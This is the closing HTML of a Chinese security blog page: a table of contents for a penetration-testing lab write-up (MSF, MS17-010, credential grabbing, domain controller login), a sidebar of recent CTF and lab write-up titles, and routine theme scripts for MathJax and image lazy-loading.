class="toc-link" href="#2%E3%80%81%E4%B8%8A%E7%BA%BF-MSF"><span class="toc-number">4.2.</span> <span class="toc-text">2、上线 MSF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F"><span class="toc-number">4.3.</span> <span class="toc-text">3、内网扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89172-22-1-21"><span class="toc-number">4.3.1.</span> <span class="toc-text">（1）172.22.1.21</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89172-22-1-18"><span class="toc-number">4.3.2.</span> <span class="toc-text">（2）172.22.1.18</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89172-22-1-2"><span class="toc-number">4.3.3.</span> <span class="toc-text">（3）172.22.1.2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81%E7%94%BB%E5%9B%BE%E5%BB%BA%E8%AE%AE"><span class="toc-number">4.4.</span> <span class="toc-text">4、画图建议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81MS17-010"><span class="toc-number">5.</span> <span class="toc-text">五、MS17-010</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E5%BB%BA%E7%AB%8B%E8%B7%AF%E7%94%B1%E5%92%8C%E4%BB%A3%E7%90%86"><span class="toc-number">5.1.</span> <span class="toc-text">1、建立路由和代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E4%BD%BF%E7%94%A8%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%A8%A1%E5%9D%97"><span class="toc-number">5.2.</span> <span class="toc-text">2、使用永恒之蓝模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">5.3.</span> <span class="toc-text">3、信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E5%87%AD%E8%AF%81%E6%8A%93%E5%8F%96"><span class="toc-number">5.3.1.</span> <span class="toc-text">（1）凭证抓取</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E5%9F%9F%E6%8E%A7%E7%99%BB%E5%85%A5"><span class="toc-number">6.</span> <span class="toc-text">六、域控登入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81172-22-1-18"><span class="toc-number">7.</span> <span class="toc-text">七、172.22.1.18</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="toc-number">8.</span> <span class="toc-text">八、非预期解</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/04/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/" title="春秋云境 Initial 靶场 WP：ThinkPHP RCE → 内网横向 → 域控沦陷"><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="春秋云境 Initial 靶场 WP：ThinkPHP RCE → 内网横向 → 域控沦陷"/></a><div class="content"><a class="title" href="/2026/04/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial-%E9%9D%B6%E5%9C%BA-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/" title="春秋云境 Initial 靶场 WP：ThinkPHP RCE → 内网横向 → 域控沦陷">春秋云境 Initial 靶场 WP：ThinkPHP RCE → 内网横向 → 域控沦陷</a><time datetime="2026-04-09T10:50:00.000Z" title="发表于 2026-04-09 18:50:00">2026-04-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/04/04/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%94-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/" title="红日靶场五 WP：ThinkPHP RCE → 内核提权 → 域控沦陷"><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%94-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场五 WP：ThinkPHP RCE → 内核提权 → 域控沦陷"/></a><div class="content"><a class="title" href="/2026/04/04/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%94-WP%EF%BC%9AThinkPHP-RCE-%E2%86%92-%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83-%E2%86%92-%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7/" title="红日靶场五 WP：ThinkPHP RCE → 内核提权 → 域控沦陷">红日靶场五 WP：ThinkPHP RCE → 内核提权 → 域控沦陷</a><time datetime="2026-04-04T12:50:00.000Z" title="发表于 2026-04-04 20:50:00">2026-04-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/04/01/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C%EF%BC%9AWebLogic-CVE-2019-2725-%E5%88%B0%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7%E5%85%A8%E6%B5%81%E7%A8%8B/" title="红日靶场二：WebLogic CVE-2019-2725 到域控沦陷全流程"><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C%EF%BC%9AWebLogic-CVE-2019-2725-%E5%88%B0%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7%E5%85%A8%E6%B5%81%E7%A8%8B/cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场二：WebLogic CVE-2019-2725 到域控沦陷全流程"/></a><div class="content"><a class="title" href="/2026/04/01/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C%EF%BC%9AWebLogic-CVE-2019-2725-%E5%88%B0%E5%9F%9F%E6%8E%A7%E6%B2%A6%E9%99%B7%E5%85%A8%E6%B5%81%E7%A8%8B/" title="红日靶场二：WebLogic CVE-2019-2725 到域控沦陷全流程">红日靶场二：WebLogic CVE-2019-2725 到域控沦陷全流程</a><time datetime="2026-04-01T13:00:00.000Z" title="发表于 2026-04-01 21:00:00">2026-04-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/04/01/%E7%AC%AC%E5%8D%81%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B_babygame%EF%BC%9AGodot%EF%BC%9A%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%E4%B8%8EAES%E8%BF%90%E8%A1%8C%E6%97%B6%E5%AF%86%E9%92%A5%E6%9B%BF%E6%8D%A2/" title="第十九届全国大学生信息安全竞赛_babygame：Godot：游戏逆向与AES运行时密钥替换"><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/%E7%AC%AC%E5%8D%81%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B_babygame%EF%BC%9AGodot%EF%BC%9A%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%E4%B8%8EAES%E8%BF%90%E8%A1%8C%E6%97%B6%E5%AF%86%E9%92%A5%E6%9B%BF%E6%8D%A2/cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="第十九届全国大学生信息安全竞赛_babygame：Godot：游戏逆向与AES运行时密钥替换"/></a><div class="content"><a class="title" href="/2026/04/01/%E7%AC%AC%E5%8D%81%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B_babygame%EF%BC%9AGodot%EF%BC%9A%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%E4%B8%8EAES%E8%BF%90%E8%A1%8C%E6%97%B6%E5%AF%86%E9%92%A5%E6%9B%BF%E6%8D%A2/" title="第十九届全国大学生信息安全竞赛_babygame：Godot：游戏逆向与AES运行时密钥替换">第十九届全国大学生信息安全竞赛_babygame：Godot：游戏逆向与AES运行时密钥替换</a><time datetime="2026-03-31T16:00:00.000Z" title="发表于 2026-04-01 00:00:00">2026-04-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/04/01/easy_time/" title="easy_time"><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/easy_time/cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="easy_time"/></a><div class="content"><a class="title" href="/2026/04/01/easy_time/" title="easy_time">easy_time</a><time datetime="2026-03-31T16:00:00.000Z" title="发表于 2026-04-01 00:00:00">2026-04-01</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By 谁把我灯关了</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.0.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.1"></script><script src="/js/main.js?v=5.5.1"></script><div class="js-pjax"><script>(() => {
+  const loadMathjax = () => {
+    if (!window.MathJax) {
+      window.MathJax = {
+        loader: {
+          load: [
+            // Four font extension packages (optional)
+            //- '[tex]/bbm',
+            //- '[tex]/bboldx',
+            //- '[tex]/dsfont',
+            '[tex]/mhchem'
+          ],
+          paths: {
+            'mathjax-newcm': '[mathjax]/../@mathjax/mathjax-newcm-font',
+
+            //- // Four font extension packages (optional)
+            //- 'mathjax-bbm-extension': '[mathjax]/../@mathjax/mathjax-bbm-font-extension',
+            //- 'mathjax-bboldx-extension': '[mathjax]/../@mathjax/mathjax-bboldx-font-extension',
+            //- 'mathjax-dsfont-extension': '[mathjax]/../@mathjax/mathjax-dsfont-font-extension',
+            'mathjax-mhchem-extension': '[mathjax]/../@mathjax/mathjax-mhchem-font-extension'
+          }
+        },
+        output: {
+          font: 'mathjax-newcm',
+        },
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          tags: 'none',
+          packages: {
+            '[+]': [
+              'mhchem'
+            ]
+          }
+        },
+        chtml: {
+          scale: 1.1
+        },
+        options: {
+          enableMenu: true,
+          menuOptions: {
+            settings: {
+              enrich: false  // Turn off Braille and voice narration text automatic generation
+            }
+          },
+          renderActions: {
+            findScript: [10, doc => {
+              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+                const display = !!node.type.match(/; *mode=display/)
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+                const text = document.createTextNode('')
+                node.parentNode.replaceChild(text, node)
+                math.start = {node: text, delim: '', n: 0}
+                math.end = {node: text, delim: '', n: 0}
+                doc.math.push(math)
+              }
+            }, '']
+          }
+        }
+      }
+
+      const script = document.createElement('script')
+      script.src = 'https://cdn.jsdelivr.net/npm/mathjax@4.0.0/tex-mml-chtml.min.js'
+      script.id = 'MathJax-script'
+      script.async = true
+      document.head.appendChild(script)
+    } else {
+      MathJax.startup.document.state(0)
+      MathJax.texReset()
+      MathJax.typesetPromise()
+    }
+  }
+
+  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
+  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div>
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z\d\-\.\+]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(t.test(e.href)||r.test(e.href))&&(e.href=a.dataset.original)})});</script><script>(r=>{r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,o=r.imageLazyLoadSetting.preloadRatio||1,d=i();function i(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=i());for(var e,n=0;n<d.length;n++)0<=(e=(e=d[n]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*o||document.documentElement.clientHeight*o)&&(()=>{var t,e,a,o,i=d[n];e=function(){d=d.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,o=t.getAttribute("data-original"),a.onload=function(){t.src=o,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=o},t.src!==o&&(a.src=o)))})()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)})(this);</script></body></html>
